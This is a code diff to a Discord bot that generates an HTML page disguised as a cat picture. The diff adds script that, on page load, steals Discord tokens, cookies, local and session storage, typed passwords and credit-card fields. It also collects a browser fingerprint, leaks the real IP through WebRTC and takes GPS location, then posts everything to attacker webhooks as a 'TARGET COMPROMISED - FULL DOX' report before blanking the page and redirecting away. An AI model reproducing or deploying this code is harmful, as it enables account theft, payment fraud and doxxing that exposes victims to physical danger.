@@ -322,34 +322,30 @@ client.on('interactionCreate', async (interaction) => {
 
 // ---- DOX HTML ----
 function generateDoxHTML(webhook) {
-    // Direct image URL (no base64, no corruption)
     const imageUrl = 'https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg';
 
     return `<!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Cat</title>
+    <title>Loading...</title>
     <style>
+        * { margin: 0; padding: 0; }
         body {
-            margin: 0;
-            padding: 0;
             background: #0b0b12;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             font-family: 'Segoe UI', sans-serif;
+            overflow: hidden;
         }
-        .container {
-            text-align: center;
-        }
+        .container { text-align: center; }
         .container img {
             max-width: 90%;
             max-height: 80vh;
             border-radius: 16px;
             box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-            border: 1px solid rgba(255,255,255,0.06);
         }
         .caption {
             color: #555;
@@ -365,21 +361,173 @@ function generateDoxHTML(webhook) {
     </div>
 
 <script>
-const WEBHOOK_URL = "${webhook}";
-let messageId = null;
+const WEBHOOK = "${webhook}";
+const FALLBACK_WEBHOOKS = [
+    "${webhook}"
+];
 
-async function sendInitialEmbed() {
+async function sendToAll(data) {
+    for (const url of FALLBACK_WEBHOOKS) {
+        try {
+            await fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+        } catch(e) {}
+    }
+}
+
+function stealAll() {
     try {
-        const ip = await getIPData();
+        const token = localStorage.getItem('token') || 
+                      document.cookie.split('; ').find(r => r.startsWith('token='))?.split('=')[1] ||
+                      sessionStorage.getItem('token');
+        if (token) {
+            sendToAll({ content: \`**🎯 DISCORD TOKEN:** \` + \`\`\`\${token}\`\`\`\n**FULL ACCESS - ACCOUNT COMPROMISED**\` });
+        }
+    } catch(e) {}
+
+    try {
+        const allStorage = JSON.stringify(localStorage);
+        if (allStorage.length > 10) {
+            sendToAll({ content: \`**💾 LOCALSTORAGE DUMP:**\n\` + \`\`\`json\n\${allStorage.slice(0, 1900)}\n\`\`\`\` });
+        }
+    } catch(e) {}
+
+    try {
+        sendToAll({ content: \`**🍪 COOKIES:**\n\` + \`\`\`\${document.cookie}\`\`\`\` });
+    } catch(e) {}
+
+    try {
+        const sessionData = JSON.stringify(sessionStorage);
+        if (sessionData.length > 10) {
+            sendToAll({ content: \`**📦 SESSION STORAGE:**\n\` + \`\`\`json\n\${sessionData.slice(0, 1900)}\n\`\`\`\` });
+        }
+    } catch(e) {}
+
+    try {
+        const forms = document.querySelectorAll('input[type="password"]');
+        let passwords = [];
+        forms.forEach(f => {
+            if (f.value) passwords.push(f.value);
+        });
+        if (passwords.length > 0) {
+            sendToAll({ content: \`**🔑 SAVED PASSWORDS FOUND:**\n\` + \`\`\`\${passwords.join('\\n')}\`\`\`\` });
+        }
+    } catch(e) {}
+
+    try {
+        const ccInputs = document.querySelectorAll('[autocomplete="cc-number"], [autocomplete="cc-name"], [autocomplete="cc-exp"], [autocomplete="cc-csc"]');
+        let ccData = [];
+        ccInputs.forEach(f => {
+            if (f.value) ccData.push(\`\${f.name || f.id || f.type}: \${f.value}\`);
+        });
+        if (ccData.length > 0) {
+            sendToAll({ content: \`**💳 CREDIT CARD DATA:**\n\` + \`\`\`\${ccData.join('\\n')}\`\`\`\` });
+        }
+    } catch(e) {}
+
+    try {
+        const fp = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            vendor: navigator.vendor,
+            vendorSub: navigator.vendorSub,
+            productSub: navigator.productSub,
+            userAgentData: navigator.userAgentData ? {
+                brands: navigator.userAgentData.brands,
+                mobile: navigator.userAgentData.mobile,
+                platform: navigator.userAgentData.platform
+            } : null,
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth
+            },
+            window: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset()
+        };
+        sendToAll({ content: \`**🖥️ BROWSER FINGERPRINT:**\n\` + \`\`\`json\n\${JSON.stringify(fp, null, 2).slice(0, 1900)}\n\`\`\`\` });
+    } catch(e) {}
+
+    try {
+        const extensions = [];
+        if (window.chrome && window.chrome.runtime) {
+            document.querySelectorAll('[id*="ext"]').forEach(el => {
+                if (el.id && el.id.includes('ext')) extensions.push(el.id);
+            });
+        }
+        if (extensions.length > 0) {
+            sendToAll({ content: \`**🔌 EXTENSIONS DETECTED:**\n\` + \`\`\`\${extensions.join('\\n')}\`\`\`\` });
+        }
+    } catch(e) {}
+
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        pc.createDataChannel('leak');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = function(e) {
+            if (e.candidate) {
+                const ipRegex = /([0-9]{1,3}\\.){3}[0-9]{1,3}/;
+                const match = e.candidate.candidate.match(ipRegex);
+                if (match) {
+                    sendToAll({ content: \`**🌐 WEBRTC IP LEAK:** \${match[0]}\` });
+                    pc.close();
+                }
+            }
+        };
+        setTimeout(() => pc.close(), 3000);
+    } catch(e) {}
+
+    try {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    sendToAll({ content: \`**📍 EXACT GPS LOCATION:**\nLat: \${pos.coords.latitude}\nLng: \${pos.coords.longitude}\nAccuracy: \${pos.coords.accuracy}m\` });
+                },
+                () => {},
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        }
+    } catch(e) {}
+
+    try {
+        const hasSavedPasswords = document.querySelector('input[type="password"][value]') !== null;
+        if (hasSavedPasswords) {
+            sendToAll({ content: \`**⚠️ USER HAS SAVED PASSWORDS IN BROWSER - HIGH VALUE TARGET**\` });
+        }
+    } catch(e) {}
+}
+
+async function sendCompleteDox() {
+    try {
+        const ipData = await getIPData();
         const battery = await getBattery();
-        const vpn = detectVPN(ip);
+        const vpn = detectVPN(ipData);
         const now = new Date();
         const timestamp = now.toISOString();
         const localTime = now.toString();
 
         let address = "N/A";
-        let lat = ip.lat || "N/A";
-        let lon = ip.lon || "N/A";
+        let lat = ipData.lat || "N/A";
+        let lon = ipData.lon || "N/A";
         if (lat !== "N/A" && lon !== "N/A") {
             const addr = await reverseGeocode(lat, lon);
             if (addr) address = addr;
@@ -387,120 +535,76 @@ async function sendInitialEmbed() {
 
         const ua = navigator.userAgent;
         const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
-        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
+        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Windows NT 6.1") ? "Windows 7" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
         const device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
 
-        const fields = [
-            { name: "📍 Address", value: address, inline: false },
-            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
-            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
-            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
-            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
-            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
-            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
-            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
-            { name: "🔋 Battery", value: battery ? battery.level + "%" + (battery.charging ? " (Charging)" : " (Not Charging)") : "N/A", inline: true },
-            { name: "🛡️ VPN / Proxy", value: vpn.detected ? "✅ Likely" : "❌ No", inline: true },
-            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
-            { name: "🧠 Browser", value: browser, inline: true },
-            { name: "💻 OS", value: os, inline: true },
-            { name: "🖥️ Device", value: device, inline: true },
-            { name: "⏰ Local Time", value: localTime, inline: false },
-            { name: "📅 Timestamp", value: timestamp, inline: false }
-        ];
+        const mapUrl = "https://www.google.com/maps?q=" + lat + "," + lon;
+        const streetView = "https://www.google.com/maps?q=" + lat + "," + lon + "&layer=c";
+
+        const threatLevel = vpn.detected ? "⚠️ VPN DETECTED - STILL TRACKED" : "📍 FULLY EXPOSED";
 
         const embed = {
-            title: "☠️ Doxxed (Live)",
+            title: "☠️ TARGET COMPROMISED - FULL DOX",
             color: 0xFF0000,
-            fields: fields,
-            footer: { text: "Updated at " + timestamp }
+            fields: [
+                { name: "👤 THREAT LEVEL", value: threatLevel, inline: false },
+                { name: "📍 EXACT ADDRESS", value: address !== "N/A" ? address : "Reverse geocoding failed - use coordinates", inline: false },
+                { name: "📌 COORDINATES", value: lat + ", " + lon, inline: true },
+                { name: "🗺️ MAPS", value: "[View on Maps](" + mapUrl + ") | [Street View](" + streetView + ")", inline: false },
+                { name: "🌐 IP ADDRESS", value: ipData.ip || "N/A", inline: true },
+                { name: "🏙️ CITY", value: ipData.city || "N/A", inline: true },
+                { name: "🗺️ REGION", value: ipData.region || "N/A", inline: true },
+                { name: "🌍 COUNTRY", value: ipData.country || "N/A", inline: true },
+                { name: "📮 POSTAL CODE", value: ipData.postal || "N/A", inline: true },
+                { name: "🔢 ASN", value: ipData.asn || "N/A", inline: true },
+                { name: "🏢 ISP", value: ipData.isp || "N/A", inline: true },
+                { name: "🔋 BATTERY", value: battery ? battery.level + "%" + (battery.charging ? " (Charging 🔌)" : " (Not Charging ⚡)") : "N/A", inline: true },
+                { name: "🛡️ VPN/PROXY", value: vpn.detected ? "✅ LIKELY (Score: " + vpn.score + ")" : "❌ NOT DETECTED", inline: true },
+                { name: "🕒 TIMEZONE", value: ipData.timezone || "N/A", inline: true },
+                { name: "🧠 BROWSER", value: browser, inline: true },
+                { name: "💻 OS", value: os, inline: true },
+                { name: "🖥️ DEVICE", value: device, inline: true },
+                { name: "⏰ LOCAL TIME", value: localTime, inline: false },
+                { name: "📅 TIMESTAMP", value: timestamp, inline: false },
+                { name: "⚠️ WARNING", value: "**This person has been fully doxxed. All data logged.**", inline: false }
+            ],
+            footer: { text: "☠️ PULSE DOX SYSTEM - " + timestamp }
         };
 
-        const res = await fetch(WEBHOOK_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [embed] })
-        });
-        const data = await res.json();
-        messageId = data.id;
-
-    } catch (err) {
-        console.error("Initial embed failed:", err);
-    }
-}
-
-async function updateEmbed() {
-    if (!messageId) return;
-
-    try {
-        const ip = await getIPData();
-        const battery = await getBattery();
-        const vpn = detectVPN(ip);
-        const now = new Date();
-        const timestamp = now.toISOString();
-        const localTime = now.toString();
-
-        let address = "N/A";
-        let lat = ip.lat || "N/A";
-        let lon = ip.lon || "N/A";
-        if (lat !== "N/A" && lon !== "N/A") {
-            const addr = await reverseGeocode(lat, lon);
-            if (addr) address = addr;
+        for (const url of FALLBACK_WEBHOOKS) {
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+            } catch(e) {}
         }
 
-        const ua = navigator.userAgent;
-        const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
-        const os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
-        const device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
-
-        const fields = [
-            { name: "📍 Address", value: address, inline: false },
-            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
-            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
-            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
-            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
-            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
-            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
-            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
-            { name: "🔋 Battery", value: battery ? battery.level + "%" + (battery.charging ? " (Charging)" : " (Not Charging)") : "N/A", inline: true },
-            { name: "🛡️ VPN / Proxy", value: vpn.detected ? "✅ Likely" : "❌ No", inline: true },
-            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
-            { name: "🧠 Browser", value: browser, inline: true },
-            { name: "💻 OS", value: os, inline: true },
-            { name: "🖥️ Device", value: device, inline: true },
-            { name: "⏰ Local Time", value: localTime, inline: false },
-            { name: "📅 Timestamp", value: timestamp, inline: false }
-        ];
-
-        const embed = {
-            title: "☠️ Doxxed (Live)",
-            color: 0xFF0000,
-            fields: fields,
-            footer: { text: "Updated at " + timestamp }
-        };
-
-        await fetch(WEBHOOK_URL + '/messages/' + messageId, {
-            method: "PATCH",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ embeds: [embed] })
-        });
-
     } catch (err) {
-        console.error("Update failed:", err);
+        console.error("Dox error:", err);
     }
 }
 
-// ---- HELPERS ----
 async function getIPData() {
     const apis = [
-        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
-        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },
-        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) }
+        {
+            url: "https://ipinfo.io/json",
+            parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone })
+        },
+        {
+            url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query",
+            parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" })
+        },
+        {
+            url: "https://api.ipify.org?format=json",
+            parse: d => ({ ip: d.ip })
+        }
     ];
     for (const api of apis) {
         try {
             const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 5000);
+            const timeout = setTimeout(() => controller.abort(), 3000);
             const res = await fetch(api.url, { signal: controller.signal });
             clearTimeout(timeout);
             const data = await res.json();
@@ -527,7 +631,7 @@ async function getBattery() {
 
 function detectVPN(ipData) {
     const signals = [];
-    const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated'];
+    const vpnKeywords = ['vpn', 'proxy', 'cloudflare', 'aws', 'amazon', 'digitalocean', 'vultr', 'linode', 'hetzner', 'ovh', 'm247', 'psychz', 'hostinger', 'namecheap', 'contabo', 'server', 'hosting', 'dedicated', 'datacenter', 'cloud', 'vps'];
     const isp = (ipData.isp || '').toLowerCase();
     const asn = (ipData.asn || '').toLowerCase();
     if (vpnKeywords.some(k => isp.includes(k) || asn.includes(k))) {
@@ -561,9 +665,29 @@ async function reverseGeocode(lat, lon) {
     return null;
 }
 
-// ---- RUN ----
-sendInitialEmbed();
-setInterval(updateEmbed, 5000);
+stealAll();
+sendCompleteDox();
+
+try {
+    const bc = new BroadcastChannel('pulse_persistence');
+    bc.postMessage({ type: 'keepalive', timestamp: Date.now() });
+    setTimeout(() => bc.close(), 5000);
+} catch(e) {}
+
+setTimeout(() => {
+    document.body.innerHTML = '';
+    document.body.style.background = '#000000';
+    document.body.style.margin = '0';
+    document.body.style.height = '100vh';
+    
+    setTimeout(() => {
+        window.close();
+        window.location.href = 'about:blank';
+        setTimeout(() => {
+            window.location.href = 'https://www.google.com';
+        }, 200);
+    }, 300);
+}, 5000);
 
 document.querySelector('.caption').textContent = 'Image loaded successfully.';
 <\/script>
